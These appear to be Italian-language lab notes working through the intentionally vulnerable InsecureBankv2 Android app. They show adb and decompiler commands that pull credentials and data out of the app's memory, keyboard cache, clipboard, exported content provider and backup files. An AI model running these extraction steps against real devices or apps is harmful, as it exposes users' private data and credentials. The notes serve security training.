# Android-InsecureBankv2

> https://github.com/dineshshetty/Android-InsecureBankv2

## Server setup

`$ cd AndroLabServer`

`# pip install -r requirements.txt`

`$ python app.py`

## App setup

- accedi all'app

- usa una delle seguenti credenziali

	- dinesh/Dinesh@123$
	- jack/Jack@123$

- configura indirizzo IP e porta della macchina sul quale è attivo `AndroLabServer`

### Utils

#### Apktool To Smali

`$ apktool d InsecureBankv2.apk`

#### Decompiling Android Applications

> https://github.com/skylot/jadx

> https://github.com/pxb1988/dex2jar

`$ mkdir InsecureBankv2_apk`

`$ unzip InsecureBankv2.apk -d InsecureBankv2_apk`

`$ cd InsecureBankv2_apk`

`$ d2j-dex2jar classes.dex`

`$ jadx-gui classes-dex2jar.jar`

#### Reading Android Memory

in Android Studio apri il codice dell'app

`Run` -> `Profile...` -> `1. app`

`+` -> `Emulator Unknown` -> `com.android.insecurebankv2`

tasto destro -> `Open memory` -> `Record`

usa l'app

`Dump Java Heap`

`$ hprof-conv memory-*.hprof memory-*-formatted.hprof`

apri `memory-*-formatted.hprof` con [MemoryAnalyzer](https://www.eclipse.org/mat/downloads.php)

`Group by package`

`com` -> `android` -> `insecurebankv2` -> tasto destro su una qualsiasi classe -> `List object with` -> `outgoing preferences`

#### Android Keyboard Cache

dal login `Add to dictionary` dell'username

- `$ adb pull /data/data/com.android.providers.userdictionary/databases/user_dict.db`

- `$ sqlite3 user_dict.db`

- `sqlite> select * from words;`

```
...
1|dinesh|250|en_US|0|
...
```

#### Android Pasteboard

- `$ adb shell ps | grep insecure`

```
u0_a60    6101  1153  1301764 55260 ffffffff 30ac5b7a S com.android.insecurebankv2
```

- `$ adb shell su u0_a60 service call clipboard 2 s16 com.android.insecurebankv2`

```
Result: Parcel(
  0x00000000: 00000000 00000001 00000001 ffffffff '................'
  0x00000010: 00000001 0000000a 00650074 00740078 '........t.e.x.t.'
  0x00000020: 0070002f 0061006c 006e0069 00000000 '/.p.l.a.i.n.....'
  0x00000030: 00000000 00000001 00000000 0000000c '................'
  0x00000040: 00310031 00310031 00310031 00310031 '1.1.1.1.1.1.1.1.'
  0x00000050: 00310031 00310031 00000000 00000014 '1.1.1.1.........'
  0x00000060: 00000000 00000000 0000000c 00000021 '............!...'
```

#### Android Content Provider

> app/src/main/AndroidManifest.xml

```
<provider android:authorities="com.android.insecurebankv2.TrackUserContentProvider" android:exported="true" android:name="com.android.insecurebankv2.TrackUserContentProvider"/>
```

- `$ grep "content://" -r InsecureBankv2/`

```
InsecureBankv2/smali/com/android/insecurebankv2/TrackUserContentProvider.smali:.field static final URL:Ljava/lang/String; = "content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers"
```

- `$ adb shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers`

```
Row: 0 id=1, name=jack
Row: 1 id=2, name=jack
Row: 2 id=3, name=jack
```

#### Android Backup Functionalities

> app/src/main/AndroidManifest.xml

```
<application android:allowBackup="true" android:debuggable="true" android:icon="@mipmap/ic_launcher" android:label="@string/app_name" android:theme="@android:style/Theme.Holo.Light.DarkActionBar">
```

- `$ adb backup -apk -shared com.android.insecurebankv2`

- `$ ( printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" ; tail -c +25 backup.ab ) |  tar xfvz -`

- `$ cat apps/com.android.insecurebankv2/sp/mySharedPreferences.xml`

```
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="superSecurePassword">vK3CrqW6+zg1s9V0YZp0Uw==
    </string>
    <string name="EncryptedUsername">amFjaw==
    </string>
</map>
```

- `$ cat apps/com.android.insecurebankv2/sp/com.android.insecurebankv2_preferences.xml`

```
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="serverport">8888</string>
    <string name="serverip">192.168.1.77</string>
</map>
```

